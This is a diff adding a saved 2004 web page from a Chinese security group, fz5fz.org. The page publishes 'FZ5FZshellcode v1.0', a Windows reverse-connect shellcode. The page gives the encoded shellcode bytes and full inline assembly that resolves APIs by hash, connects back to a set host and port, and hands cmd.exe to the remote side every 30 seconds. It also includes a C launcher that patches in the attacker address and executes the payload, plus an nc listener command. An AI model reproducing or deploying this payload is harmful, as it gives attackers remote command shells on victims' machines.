@@ -1,0 +1,197 @@
+From: <ÓÉ Microsoft Internet Explorer 5 ±£´æ>
+Subject: =?gb2312?B?Rlo1RlpzaGVsbGNvZGUgdjEuMCDWrrvjseC3tM/y0a27t8GsvdPKtc/W?=
+Date: Wed, 19 May 2004 21:36:40 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.fz5fz.org/Archives/23.htm
+X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>FZ5FZshellcode v1.0 =
+=D6=AE=BB=E3=B1=E0=B7=B4=CF=F2=D1=AD=BB=B7=C1=AC=BD=D3=CA=B5=CF=D6</TITLE=
+>
+<META content=3D"text/html; charset=3Dgb2312" http-equiv=3DContent-Type>
+<STYLE type=3Dtext/css>A:link {
+	COLOR: #0000ff; TEXT-DECORATION: none
+}
+A:visited {
+	COLOR: #0000ff; TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: #ff0000; TEXT-DECORATION: underline
+}
+INPUT {
+	FONT-SIZE: 9pt
+}
+SELECT {
+	FONT-SIZE: 9pt
+}
+TD {
+	FONT-SIZE: 9pt
+}
+.a {
+	FONT-SIZE: 10.5pt
+}
+.botton {
+	BACKGROUND-COLOR: #ffffff; BORDER-BOTTOM: #999999 1px dotted; =
+BORDER-LEFT: #999999 1px dotted; BORDER-RIGHT: #999999 1px dotted; =
+BORDER-TOP: #999999 1px dotted
+}
+.title {
+	FONT-SIZE: 12px
+}
+.search {
+	FONT-SIZE: 9pt
+}
+</STYLE>
+
+<META content=3D"MSHTML 5.00.2614.3500" name=3DGENERATOR></HEAD>
+<BODY bgColor=3D#ffffff>
+<TABLE align=3Dcenter border=3D0 cellPadding=3D0 cellSpacing=3D0 =
+width=3D"90%">
+  <TBODY>
+  <TR>
+    <TD width=3D"100%"><BR><BR>
+      <CENTER><B>FZ5FZshellcode v1.0=20
+      =
+=D6=AE=BB=E3=B1=E0=B7=B4=CF=F2=D1=AD=BB=B7=C1=AC=BD=D3=CA=B5=CF=D6</B></C=
+ENTER><BR><BR>FZ5FZshellcode v1.0=20
+      =
+=D6=AE=BB=E3=B1=E0=B7=B4=CF=F2=D1=AD=BB=B7=C1=AC=BD=D3=CA=B5=CF=D6<BR><BR=
+><BR>/*******************************************************************=
+***\<BR><BR>Name:FZ5FZshellcode<BR><BR>Platform:Windows=20
+      NT/2K/XP/2K3<BR>Version:1.0<BR>ShellCode Type:Reverse=20
+      Connection<BR>ShellCode Length:344 bytes<BR>Reverse=20
+      Host:127.0.0.1<BR>Reverse Port:40540<BR>Reverse Host =
+Offset:228<BR>Reverse=20
+      Port Offset:235<BR>Reverse Time Cycle:30 sec<BR><BR>Usage:nc -l =
+-vv -p=20
+      =
+40540<BR><BR>Author:Brief<BR>E-Mail:Brief@fz5fz.org<BR>HomePage:http://ww=
+w.fz5fz.org<BR>Date:2004-05-01<BR>CopyRight:FZ5FZ<BR><BR>\***************=
+*******************************************************/<BR><BR>#include =
+
+      &lt;winsock.h&gt;<BR><BR>#pragma comment=20
+      =
+(lib,"ws2_32")<BR><BR>#defineHostOffset228<BR>#definePortOffset235<BR><BR=
+>unsigned=20
+      char FZ5FZshellcode[] =3D=20
+      =
+<BR>"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x41\x01\x80\x34\x0B\x99\xE2\xFA"<BR=
+>"\xEB\x05\xE8\xEB\xFF\xFF\xFF"<BR>"\x72\xD1\xC8\xCF\x12\xDC\xA5\x12\xCD\=
+x9C\xE1\x9A\x4C\xCB\x12\xEB"<BR>"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x65\x34\x9A=
+\x5C\xAA\x42\xAA\x4B\x96"<BR>"\x27\x89\xA3\x4F\xED\x91\x58\x52\x94\x9A\x4=
+3\xD9\x72\x76\xA2\x86"<BR>"\xEC\x7D\xC3\x12\xC3\xBD\x9A\x44\xFF\x12\x95\x=
+D2\x12\xC3\x85\x9A"<BR>"\x44\x12\x9D\x12\x9A\x5C\x32\xC7\xC0\x5A\xF1\x7E\=
+xE0\x5F\xE0\xF1"<BR>"\x75\x60\x33\xF9\xF1\x40\x90\x6C\x34\xF1\x52\x74\x65=
+\xA2\xF1\x29"<BR>"\xD0\xB4\x42\xF1\x76\x57\x79\xF9\xF1\x34\x40\x9C\x57\xF=
+1\xEB\x67"<BR>"\x2A\x8F\xF1\x17\xD7\x97\x75\x12\x65\xFD\x38\xA9\x99\x99\x=
+99\x12"<BR>"\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3\x9C\xC0\x71\=
+xF6"<BR>"\x66\x66\x66\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE\xEA\xAB\xC6\xCD=
+"<BR>"\x66\x8F\x12\x71\xF3\x9D\xC0\x71\xCF\x66\x66\x66\x7B\x60\xAA\x66"<B=
+R>"\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF\x8D\xC9"<BR>"=
+\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x81\x12\x41\xF1\xE6\x99\x99"<BR>"\x9=
+8\xF1\x9B\x99\x07\xC5\x12\x5D\xF3\x8F\xC9\xCA\x66\xCF\x85\xF1"<BR>"\xFA\x=
+F4\xFD\x99\x10\xFF\xB1\x1A\x75\xCD\x14\xA5\xBD\xAA\x59\xAA"<BR>"\x50\x19\=
+x58\x8C\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\xFF\x5E\xDD\xBD"<BR>"\xA5\x98\x98=
+\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14"<BR>"\xDD\xBD\x89\xC=
+D\xC9\xC8\xC8\xC8\xD8\xC8\xD0\xC8\xC8\x66\xEF\xB1"<BR>"\xC8\x66\xCF\x9D\x=
+12\x55\xF3\x66\x66\xA8\x66\xCF\x91\x12\x51\xCA"<BR>"\x66\xCF\xB9\xF1\xA9\=
+xEC\x99\x99\x66\xCF\x89\x72\x1B\xCE\x66\xCF"<BR>"\x95";<BR><BR><BR>void=20
+      =
+ShellCodeAsm()<BR>{<BR>__asm<BR>{<BR>jmpShellcodeStart<BR><BR>FindProcess=
+Addr:<BR><BR>pushecx<BR>pushesi<BR><BR>moveax,dword=20
+      ptr [ebp + 0x3C]<BR>movedx,dword ptr [ebp + eax +=20
+      0x78]<BR>addedx,ebp<BR>pushedx<BR>movesi,dword ptr [edx +=20
+      =
+0x20]<BR>addesi,ebp<BR>xorecx,ecx<BR>dececx<BR><BR>NextProc:<BR>incecx<BR=
+><BR>cld<BR>lodsd<BR>addeax,ebp<BR>xorebx,ebx<BR><BR>NextByte:<BR>xoredx,=
+edx<BR>movsxedx,byte=20
+      ptr=20
+      =
+[eax]<BR>cmpdl,dh<BR>jeProcCmp<BR>rorebx,0x0D<BR>addebx,edx<BR>inceax<BR>=
+jmpNextByte<BR><BR>ProcCmp:<BR>cmpebx,dword=20
+      ptr [edi]<BR>jneNextProc<BR>popedx<BR>movebx,dword ptr [edx +=20
+      0x24]<BR>addebx,ebp<BR>movcx,word ptr [ebx + 2 * =
+ecx]<BR>movebx,dword ptr=20
+      [edx + 0x1C]<BR>addebx,ebp<BR>moveax,dword ptr [ebx + 4 *=20
+      =
+ecx]<BR>addeax,ebp<BR>stosd<BR><BR>popesi<BR>popecx<BR>ret<BR><BR>Shellco=
+deStart:<BR>push0x79C679E7//closesocket<BR>push0x60AAF9EC//connect<BR>pus=
+h0xADF509D9//WSASocketA<BR>push0x3BFCEDCB//WSAStartup<BR><BR>push0xDB2D49=
+B0//Sleep<BR>push0x60E0CEEF//ExitThread<BR>push0xCE05D9AD//WaitForSingleO=
+bject<BR>push0x16B3FE72//CreateProcessA<BR>push0xEC0E4E8E//LoadLibraryA<B=
+R>movedi,esp<BR><BR>moveax,fs:0x30<BR>moveax,[eax=20
+      + 0x0C]<BR>movesi,[eax + 0x1C]<BR>lodsd<BR>movebp,[eax +=20
+      0x08]//Kernel32.dll Image=20
+      =
+Base<BR><BR>movesi,edi<BR>push5<BR>popecx<BR><BR>GetKernel32Proc:<BR>call=
+FindProcessAddr<BR>loopGetKernel32Proc<BR><BR>push0x00003233<BR>push0x5F3=
+27377<BR>pushesp<BR>call[esi]<BR>movebp,eax<BR>push4<BR>popecx<BR><BR>Get=
+Ws2_32Proc:<BR>callFindProcessAddr<BR>loopGetWs2_32Proc<BR><BR>//WSAStart=
+up(0x0101,&amp;wsa);<BR>xoredi,edi<BR>subesp,0x190<BR>pushesp<BR>push0x01=
+01<BR>calldword=20
+      ptr [esi +=20
+      =
+0x14]<BR><BR>Cycle:<BR>//WSASocket(2,1,0,0,0,0);<BR>pusheax<BR>pusheax<BR=
+>pusheax<BR>pusheax<BR>inceax<BR>pusheax<BR>inceax<BR>pusheax<BR>calldwor=
+d=20
+      ptr [esi + 0x18]<BR>movebx,eax<BR><BR>//connect(sock,(struct =
+sockaddr=20
+      *)&amp;sin,sizeof(sin))<BR>push0x0100007F//host:=20
+      127.0.0.1<BR>push0x5C9E0002//post:=20
+      40540<BR>moveax,esp<BR>push0x16<BR>pusheax<BR>pushebx<BR>calldword =
+ptr=20
+      [esi +=20
+      =
+0x1C]<BR><BR>//CreateProcess(0,"cmd",0,0,1,0,0,0,&amp;si,&amp;pi);<BR>pus=
+h0x00646D63<BR>movdword=20
+      ptr [esi +=20
+      =
+0x28],esp<BR>subesp,0x54<BR>leaedi,[esp]<BR>xoreax,eax<BR>xorecx,ecx<BR>a=
+ddcl,0x15<BR>stosd_loop:<BR>stosd<BR>loopstosd_loop<BR><BR>movbyte=20
+      ptr [esp + 0x10],0x44<BR>movword ptr [esp + =
+0x3C],0x101<BR>movdword ptr=20
+      [esp + 0x48],ebx<BR>movdword ptr [esp + 0x4C],ebx<BR>movdword ptr =
+[esp +=20
+      0x50],ebx<BR><BR>leaeax,[esp +=20
+      =
+0x10]<BR>pushesp<BR>pusheax<BR><BR>pushecx<BR>pushecx<BR>pushecx<BR>incec=
+x<BR>pushecx<BR>dececx<BR>pushecx<BR>pushecx<BR><BR>pushdword=20
+      ptr [esi + 0x28]<BR>pushecx<BR>calldword ptr [esi +=20
+      =
+0x04]<BR>movecx,esp<BR><BR>//WaitForSingleObject(Handle,0xFFFFFFFF);<BR>p=
+ush0xFFFFFFFF<BR>pushdword=20
+      ptr [ecx]<BR>calldword ptr [esi +=20
+      =
+0x08]<BR>movecx,eax<BR><BR>//closesocket(sock)<BR>pushebx<BR>calldword =
+ptr=20
+      [esi + 0x20]<BR><BR>//Sleep(30000)<BR>push0x7530<BR>calldword ptr =
+[esi +=20
+      0x10]<BR>jmpCycle<BR><BR>//ExitThread(0)<BR>pushedi<BR>calldword =
+ptr [esi=20
+      + 0x0C]<BR><BR>}<BR><BR>return ;<BR>}<BR><BR>int main(int =
+argc,char=20
+      *argv[])<BR>{<BR>unsigned shortScPort=3D =
+40540;<BR>charScHost[16]=3D=20
+      "192.168.1.69";<BR>unsigned shortport;<BR>unsigned =
+inthost;<BR><BR>port =3D=20
+      htons(ScPort) ^ (unsigned short)0x9999;<BR>host =3D =
+inet_addr(ScHost) ^=20
+      (unsigned long)0x99999999;<BR><BR>*(unsigned short=20
+      *)&amp;FZ5FZshellcode<PORTOFFSET] =3D"port;<br">*(unsigned long=20
+      *)&amp;FZ5FZshellcode[HostOffset] =3D=20
+      =
+host;<BR><BR>__asm<BR>{<BR>leaeax,FZ5FZshellcode<BR>calleax<BR>}<BR><BR>r=
+eturn=20
+      0;<BR>}<BR><BR><BR>=B9=D8=D3=DA=CE=D2=C3=C7=A3=BA<BR><BR>FZ5FZ=20
+      =
+=D6=F7=D2=AA=B4=D3=CA=C2=CD=F8=C2=E7/=CF=B5=CD=B3=B0=B2=C8=AB=B5=C4=D1=A7=
+=CF=B0=D3=EB=D1=D0=BE=BF=A3=AC=C9=EE=C8=EB=B1=E0=B3=CC=BC=BC=CA=F5=B5=C4=C6=
+=CA=CE=F6=D3=EB=CC=BD=CC=D6=A3=AC=BC=E1=B3=D6=D4=AD=B4=B4=A3=AC=D7=B7=C7=F3=
+=B9=B2=CF=ED=A1=A3<BR>FZ5FZ=20
+      =
+=D6=F7=D2=B3=A3=BAhttp://www.fz5fz.org<BR></TD></TR></TBODY></TABLE></BOD=
+Y></HTML>
